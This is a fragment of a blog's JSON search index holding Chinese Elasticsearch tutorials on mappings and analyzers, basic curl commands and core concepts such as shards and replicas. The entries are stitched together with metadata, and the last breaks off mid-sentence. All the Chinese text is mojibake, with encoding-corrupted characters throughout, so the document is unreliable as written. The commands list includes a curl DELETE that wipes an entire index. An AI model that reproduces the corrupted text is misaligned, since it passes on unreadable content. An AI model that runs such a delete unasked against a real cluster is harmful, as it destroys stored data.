ä¸é”™ï¼Œä»¥é€šä¿—æ˜“æ‡‚çš„è¯­è¨€è®²æ˜ç™½äº†mappingçš„æ¦‚å¿µã€‚é»˜è®¤mappingelasticsearch(ä»¥ä¸‹ç®€ç§°ES)æ˜¯æ²¡æœ‰æ¨¡å¼(schema)çš„ï¼Œå½“æˆ‘ä»¬æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼šcurl -XPUT http://localhost:9200/test/item/1 -d â€˜{â€œnameâ€:â€œzachâ€, â€œdescriptionâ€: â€œA Pretty cool guy.â€}â€™ESèƒ½éå¸¸èªæ˜çš„è¯†åˆ«å‡º&quot;name&quot;å’Œ&quot;description&quot;å­—æ®µçš„ç±»å‹æ˜¯stringï¼Œ ESé»˜è®¤ä¼šåˆ›å»ºä»¥ä¸‹çš„mappingã€‚mappings: {item: {properties: {description: {type: string}name: {type: string}}}}ä»€ä¹ˆæ˜¯mappingESçš„mappingéå¸¸ç±»ä¼¼äºé™æ€è¯­è¨€ä¸­çš„æ•°æ®ç±»å‹ï¼šå£°æ˜ä¸€ä¸ªå˜é‡ä¸ºintç±»å‹çš„å˜é‡ï¼Œ ä»¥åè¿™ä¸ªå˜é‡éƒ½åªèƒ½å­˜å‚¨intç±»å‹çš„æ•°æ®ã€‚åŒæ ·çš„ï¼Œ ä¸€ä¸ªnumberç±»å‹çš„mappingå­—æ®µåªèƒ½å­˜å‚¨numberç±»å‹çš„æ•°æ®ã€‚åŒè¯­è¨€çš„æ•°æ®ç±»å‹ç›¸æ¯”ï¼Œmappingè¿˜æœ‰ä¸€äº›å…¶ä»–çš„å«ä¹‰ï¼Œmappingä¸ä»…å‘Šè¯‰ESä¸€ä¸ªfieldä¸­æ˜¯ä»€ä¹ˆç±»å‹çš„å€¼ï¼Œ å®ƒè¿˜å‘Šè¯‰ESå¦‚ä½•ç´¢å¼•æ•°æ®ä»¥åŠæ•°æ®æ˜¯å¦èƒ½è¢«æœç´¢åˆ°ã€‚å½“ä½ çš„æŸ¥è¯¢æ²¡æœ‰è¿”å›ç›¸åº”çš„æ•°æ®ï¼Œ ä½ çš„mappingå¾ˆæœ‰å¯èƒ½æœ‰é—®é¢˜ã€‚å½“ä½ æ‹¿ä¸å‡†çš„æ—¶å€™ï¼Œ ç›´æ¥æ£€æŸ¥ä½ çš„mappingã€‚å‰–æmappingä¸€ä¸ªmappingç”±ä¸€ä¸ªæˆ–å¤šä¸ªanalyzerç»„æˆï¼Œ ä¸€ä¸ªanalyzeråˆç”±ä¸€ä¸ªæˆ–å¤šä¸ªfilterç»„æˆçš„ã€‚å½“ESç´¢å¼•æ–‡æ¡£çš„æ—¶å€™ï¼Œå®ƒæŠŠå­—æ®µä¸­çš„å†…å®¹ä¼ é€’ç»™ç›¸åº”çš„analyzerï¼Œanalyzerå†ä¼ é€’ç»™å„è‡ªçš„filtersã€‚filterçš„åŠŸèƒ½å¾ˆå®¹æ˜“ç†è§£ï¼šä¸€ä¸ªfilterå°±æ˜¯ä¸€ä¸ªè½¬æ¢æ•°æ®çš„æ–¹æ³•ï¼Œ è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›å¦ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ¯”å¦‚ä¸€ä¸ªå°†å­—ç¬¦ä¸²è½¬ä¸ºå°å†™çš„æ–¹æ³•å°±æ˜¯ä¸€ä¸ªfilterå¾ˆå¥½çš„ä¾‹å­ã€‚ä¸€ä¸ªanalyzerç”±ä¸€ç»„é¡ºåºæ’åˆ—çš„filterç»„æˆï¼Œæ‰§è¡Œåˆ†æçš„è¿‡ç¨‹å°±æ˜¯æŒ‰é¡ºåºä¸€ä¸ªfilterä¸€ä¸ªfilterä¾æ¬¡è°ƒç”¨ï¼Œ ESå­˜å‚¨å’Œç´¢å¼•æœ€åå¾—åˆ°çš„ç»“æœã€‚æ€»ç»“æ¥è¯´ï¼Œ mappingçš„ä½œç”¨å°±æ˜¯æ‰§è¡Œä¸€ç³»åˆ—çš„æŒ‡ä»¤å°†è¾“å…¥çš„æ•°æ®è½¬æˆå¯æœç´¢çš„ç´¢å¼•é¡¹ã€‚é»˜è®¤analyzerå›åˆ°æˆ‘ä»¬çš„ä¾‹å­ï¼Œ ESçŒœæµ‹descriptionå­—æ®µæ˜¯stringç±»å‹ï¼Œäºæ˜¯é»˜è®¤åˆ›å»ºä¸€ä¸ªstringç±»å‹çš„mappingï¼Œå®ƒä½¿ç”¨é»˜è®¤çš„å…¨å±€analyzerï¼Œ é»˜è®¤çš„analyzeræ˜¯æ ‡å‡†analyzer, è¿™ä¸ªæ ‡å‡†analyzeræœ‰ä¸‰ä¸ªfilterï¼štoken filter, lowercase filterå’Œstop token filterã€‚æˆ‘ä»¬å¯ä»¥åœ¨åšæŸ¥è¯¢çš„æ—¶å€™é”®å…¥_analyzeå…³é”®å­—æŸ¥çœ‹åˆ†æçš„è¿‡ç¨‹ã€‚ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤æŸ¥çœ‹descriptionå­—æ®µçš„è½¬æ¢è¿‡ç¨‹ï¼šcurl -X GET â€œhttp://localhost:9200/test/_analyze?analyzer=standard&amp;pretty=trueâ€ -d â€œA Pretty cool guy.â€{â€œtokensâ€ :å¯ä»¥çœ‹åˆ°ï¼Œ æˆ‘ä»¬çš„descriptionå­—æ®µçš„å€¼è½¬æ¢æˆäº†, , ï¼Œ åœ¨è½¬æ¢è¿‡ç¨‹ä¸­å¤§å†™çš„Aï¼Œ æ ‡ç‚¹ç¬¦å·éƒ½è¢«filterè¿‡æ»¤æ‰äº†ï¼Œ Prettyä¹Ÿè½¬æˆäº†å…¨å°å†™çš„prettyï¼Œ è¿™é‡Œæ¯”è¾ƒé‡è¦çš„æ˜¯ï¼Œ å³ä½¿ESå­˜å‚¨æ•°æ®çš„æ—¶å€™ä»ç„¶å­˜å‚¨çš„æ˜¯å®Œæ•´çš„æ•°æ®ï¼Œ ä½†æ˜¯å¯ä»¥æœç´¢åˆ°è¿™æ¡æ•°æ®çš„å…³é”®å­—åªå‰©ä¸‹è¿™ä¸‰ä¸ªå•è¯äº†ï¼Œ å…¶ä»–çš„éƒ½æ˜¯æŠ›å¼ƒæ‰äº†ã€‚çœ‹çœ‹ä»¥å•è¯aæ¥æœç´¢çš„ç»“æœï¼š$ curl -X GET â€œhttp://localhost:9200/test/_search?pretty=trueâ€ -d â€˜{â€œqueryâ€ : {â€œtextâ€ : { â€œdescriptionâ€: â€œaâ€ }}}â€™{â€œtookâ€ : 29,â€œtimed_outâ€ : false,â€œ_shardsâ€ : {â€œtotalâ€ : 5,â€œsuccessfulâ€ : 5,â€œfailedâ€ : 0},â€œhitsâ€ : {â€œtotalâ€ : 0,â€œmax_scoreâ€ : null,â€œhitsâ€ :}}textç±»å‹çš„æœç´¢åœ¨æŸ¥è¯¢è¿‡ç¨‹ä¸­ä½¿ç”¨äº†å’Œä¹‹å‰æ’å…¥æ•°æ®ç›¸åŒçš„åˆ†æ/è¿‡æ»¤ç³»ç»Ÿï¼Œ æ‰€ä»¥æˆ‘ä»¬è¾“å…¥&quot;a&quot;ï¼Œmappingä¸ä¼šæœ‰ä»»ä½•è¿”å›ï¼Œ å› ä¸ºå•è¯â€œaâ€ä¸ä¼šè¢«ESå­˜å‚¨å’Œç´¢å¼•ã€‚åè¿‡æ¥ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨å•è¯&quot;cool&quot;è¿›è¡Œæœç´¢ï¼šcurl -X GET â€œhttp://localhost:9200/test/_search?pretty=trueâ€ -d â€˜{â€œqueryâ€ : {â€œtextâ€ : { â€œdescriptionâ€: â€œcoolâ€ }}}â€™{â€œtookâ€ : 29,â€œtimed_outâ€ : false,â€œ_shardsâ€ : {â€œtotalâ€ : 5,â€œsuccessfulâ€ : 5,â€œfailedâ€ : 0},â€œhitsâ€ : {â€œtotalâ€ : 1,â€œmax_scoreâ€ : 0.15342641,â€œhitsâ€ :}}ç°åœ¨å°±èƒ½å¾—åˆ°æ­£ç¡®çš„ç»“æœï¼Œè¿™æ˜¯ä¸€ä¸ªå…¬è®¤çš„ç®€å•ä¾‹å­ï¼Œ ä½†æ˜¯å®ƒæè¿°äº†ESæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œ ä¸è¦æŠŠmappingæƒ³æˆæ˜¯æ•°æ®ç±»å‹ï¼Œ æŠŠå®ƒæƒ³è±¡æˆæ˜¯æœç´¢æ•°æ®çš„æŒ‡ä»¤é›†åˆã€‚å¦‚æœä½ ä¸æƒ³å­—ç¬¦&quot;a&quot;è¢«åˆ é™¤ï¼Œ ä½ éœ€è¦ä¿®æ”¹ä½ çš„analyzerã€‚åŸæ–‡: http://euphonious-intuition.com/2012/07/an-introduction-to-mapping-in-elasticsearch/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"elasticsearch åŸºæœ¬å‘½ä»¤","slug":"history/tech/5953c4d0c2b92f5665eed99e","date":"2015-12-23T03:22:35.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed99e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed99e/","excerpt":"","text":"å¼€å§‹å­¦ä¹ ä½¿ç”¨ elasticsearch, æŠŠæ­¥éª¤è®°å½•åœ¨è¿™é‡Œï¼šæœ€å¤§çš„ç‰¹ç‚¹ï¼šæ•°æ®åº“çš„ database, å°±æ˜¯ indexæ•°æ®åº“çš„ table, å°±æ˜¯ tagä¸è¦ä½¿ç”¨browserï¼Œ ä½¿ç”¨curlæ¥è¿›è¡Œå®¢æˆ·ç«¯æ“ä½œ. å¦åˆ™ä¼šå‡ºç° java heap ooxxâ€¦curl: -X åé¢è·Ÿ RESTful ï¼š GET, POST â€¦-d åé¢è·Ÿæ•°æ®ã€‚ (d = data to send)create:æŒ‡å®š ID æ¥å»ºç«‹æ–°è®°å½•ã€‚ ï¼ˆè²Œä¼¼PUTï¼Œ POSTéƒ½å¯ä»¥ï¼‰$ curl -XPOST localhost:9200/films/md/2 -d â€™{ â€œnameâ€:â€œhei yi renâ€, â€œtagâ€: â€œgoodâ€}â€™ä½¿ç”¨è‡ªåŠ¨ç”Ÿæˆçš„ ID å»ºç«‹æ–°çºªå½•ï¼š$ curl -XPOST localhost:9200/films/md -d â€™{ â€œnameâ€:â€œma da jia si jia3â€, â€œtagâ€: â€œgoodâ€}â€™æŸ¥è¯¢ï¼š2.1 æŸ¥è¯¢æ‰€æœ‰çš„ index, type:$ curl localhost:9200/_search?pretty=true2.2 æŸ¥è¯¢æŸä¸ªindexä¸‹æ‰€æœ‰çš„type:$ curl localhost:9200/films/_search2.3 æŸ¥è¯¢æŸä¸ªindex ä¸‹ï¼Œ æŸä¸ª typeä¸‹æ‰€æœ‰çš„è®°å½•ï¼š$ curl localhost:9200/films/md/_search?pretty=true2.4 å¸¦æœ‰å‚æ•°çš„æŸ¥è¯¢ï¼š$ curl localhost:9200/films/md/_search?q=tag:good{â€œtookâ€:7,â€œtimed_outâ€:false,&quot;_shards&quot;:{â€œtotalâ€:5,â€œsuccessfulâ€:5,â€œfailedâ€:0},â€œhitsâ€:{â€œtotalâ€:2,â€œmax_scoreâ€:1.0,â€œhitsâ€:}}2.5 ä½¿ç”¨JSONå‚æ•°çš„æŸ¥è¯¢ï¼š ï¼ˆæ³¨æ„ query å’Œ term å…³é”®å­—ï¼‰$ curl localhost:9200/film/_search -d â€™{â€œqueryâ€ : { â€œtermâ€: { â€œtagâ€:â€œbadâ€}}}â€™update$ curl -XPUT localhost:9200/films/md/1 -d { â€¦(data)â€¦ }åˆ é™¤ã€‚ åˆ é™¤æ‰€æœ‰çš„ï¼š$ curl -XDELETE localhost:9200/films","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"æœ€å®Œæ•´çš„Elasticsearch åŸºç¡€æ•™ç¨‹","slug":"history/tech/5953c4d0c2b92f5665eed99d","date":"2015-12-23T03:18:07.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed99d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed99d/","excerpt":"","text":"ç¿»è¯‘ï¼šæ½˜é£ï¼ˆtinylambda@gmail.comï¼‰åŸºç¡€æ¦‚å¿µElasticsearchæœ‰å‡ ä¸ªæ ¸å¿ƒæ¦‚å¿µã€‚ä»ä¸€å¼€å§‹ç†è§£è¿™äº›æ¦‚å¿µä¼šå¯¹æ•´ä¸ªå­¦ä¹ è¿‡ç¨‹æœ‰è«å¤§çš„å¸®åŠ©ã€‚ æ¥è¿‘å®æ—¶ï¼ˆNRTï¼‰ Elasticsearchæ˜¯ä¸€ä¸ªæ¥è¿‘å®æ—¶çš„æœç´¢å¹³å°ã€‚è¿™æ„å‘³ç€ï¼Œä»ç´¢å¼•ä¸€ä¸ªæ–‡æ¡£ç›´åˆ°è¿™ä¸ªæ–‡æ¡£èƒ½å¤Ÿè¢«æœç´¢åˆ°æœ‰ä¸€ä¸ªè½»å¾®çš„å»¶è¿Ÿï¼ˆé€šå¸¸æ˜¯1ç§’ï¼‰ã€‚ é›†ç¾¤ï¼ˆclusterï¼‰ ä¸€ä¸ªé›†ç¾¤å°±æ˜¯ç”±ä¸€ä¸ªæˆ–å¤šä¸ªèŠ‚ç‚¹ç»„ç»‡åœ¨ä¸€èµ·ï¼Œå®ƒä»¬å…±åŒæŒæœ‰ä½ æ•´ä¸ªçš„æ•°æ®ï¼Œå¹¶ä¸€èµ·æä¾›ç´¢å¼•å’Œæœç´¢åŠŸèƒ½ã€‚ä¸€ä¸ªé›†ç¾¤ç”±ä¸€ä¸ªå”¯ä¸€çš„åå­—æ ‡è¯†ï¼Œè¿™ä¸ªåå­—é»˜è®¤å°±æ˜¯ â€œelasticsearchâ€ã€‚è¿™ä¸ªåå­—æ˜¯é‡è¦çš„ï¼Œå› ä¸ºä¸€ä¸ªèŠ‚ç‚¹åªèƒ½é€šè¿‡æŒ‡å®šæŸä¸ªé›†ç¾¤çš„åå­—ï¼Œæ¥åŠ å…¥è¿™ä¸ªé›†ç¾¤ã€‚åœ¨äº§å“ç¯å¢ƒä¸­æ˜¾å¼åœ°è®¾å®šè¿™ä¸ªåå­—æ˜¯ä¸€ä¸ªå¥½ ä¹ æƒ¯ï¼Œä½†æ˜¯ä½¿ç”¨é»˜è®¤å€¼æ¥è¿›è¡Œæµ‹è¯•/å¼€å‘ä¹Ÿæ˜¯ä¸é”™çš„ã€‚ èŠ‚ç‚¹ï¼ˆnodeï¼‰ ä¸€ä¸ªèŠ‚ç‚¹æ˜¯ä½ é›†ç¾¤ä¸­çš„ä¸€ä¸ªæœåŠ¡å™¨ï¼Œä½œä¸ºé›†ç¾¤çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå­˜å‚¨ä½ çš„æ•°æ®ï¼Œå‚ä¸é›†ç¾¤çš„ç´¢å¼•å’Œæœç´¢åŠŸèƒ½ã€‚å’Œé›†ç¾¤ç±»ä¼¼ï¼Œä¸€ä¸ªèŠ‚ç‚¹ä¹Ÿæ˜¯ç”±ä¸€ä¸ªåå­—æ¥æ ‡è¯†çš„ï¼Œé»˜è®¤æƒ…å†µ ä¸‹ï¼Œè¿™ä¸ªåå­—æ˜¯ä¸€ä¸ªéšæœºçš„æ¼«å¨æ¼«ç”»è§’è‰²çš„åå­—ï¼Œè¿™ä¸ªåå­—ä¼šåœ¨å¯åŠ¨çš„æ—¶å€™èµ‹äºˆèŠ‚ç‚¹ã€‚è¿™ä¸ªåå­—å¯¹äºç®¡ç†å·¥ä½œæ¥è¯´æŒºé‡è¦çš„ï¼Œå› ä¸ºåœ¨è¿™ä¸ªç®¡ç†è¿‡ç¨‹ä¸­ï¼Œä½ ä¼šå»ç¡®å®šç½‘ ç»œä¸­çš„å“ªäº›æœåŠ¡å™¨å¯¹åº”äºElasticsearché›†ç¾¤ä¸­çš„å“ªäº›èŠ‚ç‚¹ã€‚ ä¸€ä¸ªèŠ‚ç‚¹å¯ä»¥é€šè¿‡é…ç½®é›†ç¾¤åç§°çš„æ–¹å¼æ¥åŠ å…¥ä¸€ä¸ªæŒ‡å®šçš„é›†ç¾¤ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½ä¼šè¢«å®‰æ’åŠ å…¥åˆ°ä¸€ä¸ªå«åšâ€œelasticsearchâ€çš„é›†ç¾¤ä¸­ï¼Œè¿™æ„ å‘³ç€ï¼Œå¦‚æœä½ åœ¨ä½ çš„ç½‘ç»œä¸­å¯åŠ¨äº†è‹¥å¹²ä¸ªèŠ‚ç‚¹ï¼Œå¹¶å‡å®šå®ƒä»¬èƒ½å¤Ÿç›¸äº’å‘ç°å½¼æ­¤ï¼Œå®ƒä»¬å°†ä¼šè‡ªåŠ¨åœ°å½¢æˆå¹¶åŠ å…¥åˆ°ä¸€ä¸ªå«åšâ€œelasticsearchâ€çš„é›†ç¾¤ä¸­ã€‚ åœ¨ä¸€ä¸ªé›†ç¾¤é‡Œï¼Œåªè¦ä½ æƒ³ï¼Œå¯ä»¥æ‹¥æœ‰ä»»æ„å¤šä¸ªèŠ‚ç‚¹ã€‚è€Œä¸”ï¼Œå¦‚æœå½“å‰ä½ çš„ç½‘ç»œä¸­æ²¡æœ‰è¿è¡Œä»»ä½•ElasticsearchèŠ‚ç‚¹ï¼Œè¿™æ—¶å¯åŠ¨ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¼šé»˜è®¤åˆ›å»ºå¹¶åŠ å…¥ä¸€ä¸ªå«åšâ€œelasticsearchâ€çš„é›†ç¾¤ã€‚ ç´¢å¼•ï¼ˆindexï¼‰ ä¸€ä¸ªç´¢å¼•å°±æ˜¯ä¸€ä¸ªæ‹¥æœ‰å‡ åˆ†ç›¸ä¼¼ç‰¹å¾çš„æ–‡æ¡£çš„é›†åˆã€‚æ¯”å¦‚è¯´ï¼Œä½ å¯ä»¥æœ‰ä¸€ä¸ªå®¢æˆ·æ•°æ®çš„ç´¢å¼•ï¼Œå¦ä¸€ä¸ªäº§å“ç›®å½•çš„ç´¢å¼•ï¼Œè¿˜æœ‰ä¸€ä¸ªè®¢å•æ•°æ®çš„ç´¢å¼•ã€‚ä¸€ä¸ªç´¢å¼•ç”±ä¸€ä¸ªå å­—æ¥æ ‡è¯†ï¼ˆå¿…é¡»å…¨éƒ¨æ˜¯å°å†™å­—æ¯çš„ï¼‰ï¼Œå¹¶ä¸”å½“æˆ‘ä»¬è¦å¯¹å¯¹åº”äºè¿™ä¸ªç´¢å¼•ä¸­çš„æ–‡æ¡£è¿›è¡Œç´¢å¼•ã€æœç´¢ã€æ›´æ–°å’Œåˆ é™¤çš„æ—¶å€™ï¼Œéƒ½è¦ä½¿ç”¨åˆ°è¿™ä¸ªåå­—ã€‚ åœ¨ä¸€ä¸ªé›†ç¾¤ä¸­ï¼Œå¦‚æœä½ æƒ³ï¼Œå¯ä»¥å®šä¹‰ä»»æ„å¤šçš„ç´¢å¼•ã€‚ ç±»å‹ï¼ˆtypeï¼‰ åœ¨ä¸€ä¸ªç´¢å¼•ä¸­ï¼Œä½ å¯ä»¥å®šä¹‰ä¸€ç§æˆ–å¤šç§ç±»å‹ã€‚ä¸€ä¸ªç±»å‹æ˜¯ä½ çš„ç´¢å¼•çš„ä¸€ä¸ªé€»è¾‘ä¸Šçš„åˆ†ç±»/åˆ†åŒºï¼Œå…¶è¯­ä¹‰å®Œå…¨ç”±ä½ æ¥å®šã€‚é€šå¸¸ï¼Œä¼šä¸ºå…·æœ‰ä¸€ç»„å…±åŒå­—æ®µçš„æ–‡æ¡£å®šä¹‰ä¸€ä¸ª ç±»å‹ã€‚æ¯”å¦‚è¯´ï¼Œæˆ‘ä»¬å‡è®¾ä½ è¿è¥ä¸€ä¸ªåšå®¢å¹³å°å¹¶ä¸”å°†ä½ æ‰€æœ‰çš„æ•°æ®å­˜å‚¨åˆ°ä¸€ä¸ªç´¢å¼•ä¸­ã€‚åœ¨è¿™ä¸ªç´¢å¼•ä¸­ï¼Œä½ å¯ä»¥ä¸ºç”¨æˆ·æ•°æ®å®šä¹‰ä¸€ä¸ªç±»å‹ï¼Œä¸ºåšå®¢æ•°æ®å®šä¹‰å¦ä¸€ä¸ªç±» å‹ï¼Œå½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä¸ºè¯„è®ºæ•°æ®å®šä¹‰å¦ä¸€ä¸ªç±»å‹ã€‚ æ–‡æ¡£ï¼ˆdocumentï¼‰ ä¸€ä¸ªæ–‡æ¡£æ˜¯ä¸€ä¸ªå¯è¢«ç´¢å¼•çš„åŸºç¡€ä¿¡æ¯å•å…ƒã€‚æ¯”å¦‚ï¼Œä½ å¯ä»¥æ‹¥æœ‰æŸä¸€ä¸ªå®¢æˆ·çš„æ–‡æ¡£ï¼ŒæŸä¸€ä¸ªäº§å“çš„ä¸€ä¸ªæ–‡æ¡£ï¼Œå½“ç„¶ï¼Œä¹Ÿå¯ä»¥æ‹¥æœ‰æŸä¸ªè®¢å•çš„ä¸€ä¸ªæ–‡æ¡£ã€‚æ–‡æ¡£ä»¥ JSONï¼ˆJavascript Object Notationï¼‰æ ¼å¼æ¥è¡¨ç¤ºï¼Œè€ŒJSONæ˜¯ä¸€ä¸ªåˆ°å¤„å­˜åœ¨çš„äº’è”ç½‘æ•°æ®äº¤äº’æ ¼å¼ã€‚ åœ¨ä¸€ä¸ªindex/typeé‡Œé¢ï¼Œåªè¦ä½ æƒ³ï¼Œä½ å¯ä»¥å­˜å‚¨ä»»æ„å¤šçš„æ–‡æ¡£ã€‚æ³¨æ„ï¼Œå°½ç®¡ä¸€ä¸ªæ–‡æ¡£ï¼Œç‰©ç†ä¸Šå­˜åœ¨äºä¸€ä¸ªç´¢å¼•ä¹‹ä¸­ï¼Œæ–‡æ¡£å¿…é¡»è¢«ç´¢å¼•/èµ‹äºˆä¸€ä¸ªç´¢å¼•çš„typeã€‚ åˆ†ç‰‡å’Œå¤åˆ¶ï¼ˆshards &amp; replicasï¼‰ ä¸€ä¸ªç´¢å¼•å¯ä»¥å­˜å‚¨è¶…å‡ºå•ä¸ªç»“ç‚¹ç¡¬ä»¶é™åˆ¶çš„å¤§é‡æ•°æ®ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªå…·æœ‰10äº¿æ–‡æ¡£çš„ç´¢å¼•å æ®1TBçš„ç£ç›˜ç©ºé—´ï¼Œè€Œä»»ä¸€èŠ‚ç‚¹éƒ½æ²¡æœ‰è¿™æ ·å¤§çš„ç£ç›˜ç©ºé—´ï¼›æˆ–è€…å•ä¸ªèŠ‚ç‚¹å¤„ç†æœç´¢è¯·æ±‚ï¼Œå“åº”å¤ªæ…¢ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒElasticsearchæä¾›äº†å°†ç´¢å¼•åˆ’åˆ†æˆå¤šä»½çš„èƒ½åŠ›ï¼Œè¿™äº›ä»½å°±å«åšåˆ†ç‰‡ã€‚å½“ä½ åˆ›å»ºä¸€ä¸ªç´¢å¼•çš„æ—¶å€™ï¼Œä½ å¯ä»¥æŒ‡å®šä½ æƒ³è¦çš„åˆ†ç‰‡çš„æ•°é‡ã€‚æ¯ä¸ªåˆ†ç‰‡æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªåŠŸèƒ½å®Œå–„å¹¶ä¸”ç‹¬ç«‹çš„â€œç´¢å¼•â€ï¼Œè¿™ä¸ªâ€œç´¢å¼•â€å¯ä»¥è¢«æ”¾ç½®åˆ°é›†ç¾¤ä¸­çš„ä»»ä½•èŠ‚ç‚¹ä¸Šã€‚ åˆ†ç‰‡ä¹‹æ‰€ä»¥é‡è¦ï¼Œä¸»è¦æœ‰ä¸¤æ–¹é¢çš„åŸå› ï¼š - å…è®¸ä½ æ°´å¹³åˆ†å‰²/æ‰©å±•ä½ çš„å†…å®¹å®¹é‡ - å…è®¸ä½ åœ¨åˆ†ç‰‡ï¼ˆæ½œåœ¨åœ°ï¼Œä½äºå¤šä¸ªèŠ‚ç‚¹ä¸Šï¼‰ä¹‹ä¸Šè¿›è¡Œåˆ†å¸ƒå¼çš„ã€å¹¶è¡Œçš„æ“ä½œï¼Œè¿›è€Œæé«˜æ€§èƒ½/ååé‡ è‡³äºä¸€ä¸ªåˆ†ç‰‡æ€æ ·åˆ†å¸ƒï¼Œå®ƒçš„æ–‡æ¡£æ€æ ·èšåˆå›æœç´¢è¯·æ±‚ï¼Œæ˜¯å®Œå…¨ç”±Elasticsearchç®¡ç†çš„ï¼Œå¯¹äºä½œä¸ºç”¨æˆ·çš„ä½ æ¥è¯´ï¼Œè¿™äº›éƒ½æ˜¯é€æ˜çš„ã€‚ åœ¨ä¸€ä¸ªç½‘ç»œ/äº‘çš„ç¯å¢ƒé‡Œï¼Œå¤±è´¥éšæ—¶éƒ½å¯èƒ½å‘ç”Ÿï¼Œåœ¨æŸä¸ªåˆ†ç‰‡/èŠ‚ç‚¹ä¸çŸ¥æ€ä¹ˆçš„å°±å¤„äºç¦»çº¿çŠ¶æ€ï¼Œæˆ–è€…ç”±äºä»»ä½•åŸå› æ¶ˆå¤±äº†ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œæœ‰ä¸€ä¸ªæ•…éšœè½¬ç§»æœºåˆ¶æ˜¯é å¸¸æœ‰ç”¨å¹¶ä¸”æ˜¯å¼ºçƒˆæ¨èçš„ã€‚ä¸ºæ­¤ç›®çš„ï¼ŒElasticsearchå…è®¸ä½ åˆ›å»ºåˆ†ç‰‡çš„ä¸€ä»½æˆ–å¤šä»½æ‹·è´ï¼Œè¿™äº›æ‹·è´å«åšå¤åˆ¶åˆ†ç‰‡ï¼Œæˆ–è€…ç›´æ¥å«å¤åˆ¶ã€‚ å¤åˆ¶ä¹‹æ‰€ä»¥é‡è¦ï¼Œæœ‰ä¸¤ä¸ªä¸»è¦åŸå› ï¼š - åœ¨åˆ†ç‰‡/èŠ‚ç‚¹å¤±è´¥çš„æƒ…å†µä¸‹ï¼Œæä¾›äº†é«˜å¯ç”¨æ€§ã€‚å› ä¸ºè¿™ä¸ªåŸå› ï¼Œæ³¨æ„åˆ°å¤åˆ¶åˆ†ç‰‡ä»ä¸ä¸åŸ/ä¸»è¦ï¼ˆoriginal/primaryï¼‰åˆ†ç‰‡ç½®äºåŒä¸€èŠ‚ç‚¹ä¸Šæ˜¯éå¸¸é‡è¦çš„ã€‚ - æ‰©å±•ä½ çš„æœç´¢é‡/ååé‡ï¼Œå› ä¸ºæœç´¢å¯ä»¥åœ¨æ‰€æœ‰çš„å¤åˆ¶ä¸Šå¹¶è¡Œè¿è¡Œ æ€»ä¹‹ï¼Œæ¯ä¸ªç´¢å¼•å¯ä»¥è¢«åˆ†æˆå¤šä¸ªåˆ†ç‰‡ã€‚ä¸€ä¸ªç´¢å¼•ä¹Ÿå¯ä»¥è¢«å¤åˆ¶0æ¬¡ï¼ˆæ„æ€æ˜¯æ²¡æœ‰å¤åˆ¶ï¼‰æˆ–å¤šæ¬¡ã€‚ä¸€æ—¦å¤åˆ¶äº†ï¼Œæ¯ä¸ªç´¢å¼•å°±æœ‰äº†ä¸»åˆ†ç‰‡ï¼ˆä½œä¸ºå¤åˆ¶æºçš„åŸæ¥çš„åˆ†ç‰‡ï¼‰å’Œ å¤åˆ¶åˆ†ç‰‡ï¼ˆä¸»åˆ†ç‰‡çš„æ‹·è´ï¼‰ä¹‹åˆ«ã€‚åˆ†ç‰‡å’Œå¤åˆ¶çš„æ•°é‡å¯ä»¥åœ¨ç´¢å¼•åˆ›å»ºçš„æ—¶å€™æŒ‡å®šã€‚åœ¨ç´¢å¼•åˆ›å»ºä¹‹åï¼Œä½ å¯ä»¥åœ¨ä»»ä½•æ—¶å€™åŠ¨æ€åœ°æ”¹å˜å¤åˆ¶çš„æ•°é‡ï¼Œä½†æ˜¯ä½ äº‹åä¸èƒ½æ”¹å˜ åˆ†ç‰‡çš„æ•°é‡ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒElasticsearchä¸­çš„æ¯ä¸ªç´¢å¼•è¢«åˆ†ç‰‡5ä¸ªä¸»åˆ†ç‰‡å’Œ1ä¸ªå¤åˆ¶ï¼Œè¿™æ„å‘³ç€ï¼Œå¦‚æœä½ çš„é›†ç¾¤ä¸­è‡³å°‘æœ‰ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œä½ 